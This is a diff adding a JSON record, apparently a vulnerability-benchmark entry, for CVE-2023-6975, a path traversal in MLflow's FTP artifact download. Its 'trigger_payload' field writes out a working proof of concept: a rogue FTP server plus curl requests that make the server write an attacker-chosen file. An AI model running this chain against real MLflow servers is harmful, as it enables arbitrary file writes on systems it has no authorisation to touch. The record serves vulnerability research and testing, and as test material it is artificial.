@@ -1,0 +1,15 @@
+{
+  "file_id": "186_mlflow_huntr_029a3824-cee3-4cf1-b260-7138aa539b85",
+  "numeric_id": "186",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Path traversal in FTP artifact download due to improper filename normalization",
+  "cve": "CVE-2023-6975",
+  "cwe": "CWE-29: Path Traversal",
+  "library": "mlflow",
+  "affected_version": ">= 2.0, < 2.9.2",
+  "vulnerable_function": "mlflow.store.artifact.ftp_artifact_repo.FTPArtifactRepository._download_file",
+  "triggerability": "indirect",
+  "trigger_payload": "python rogue_ftp.py --port 4444 --path /tmp/poc.txt --content \"Hello :)\"\nmlflow ui --host 0.0.0.0:5000\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' 'http://127.0.0.1:5000/ajax/registered-models/create'\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"source\": \"ftp://mizu:mizu@127.0.0.1:4444\"}' 'http://127.0.0.1:5000/ajax/model-versions/create'\ncurl 'http://127.0.0.1:5000/model-versions/get-artifact?path=random&name=poc&version=1'",
+  "oracle": "File /tmp/poc.txt is created on the server with the content 'Hello :)'"
+}
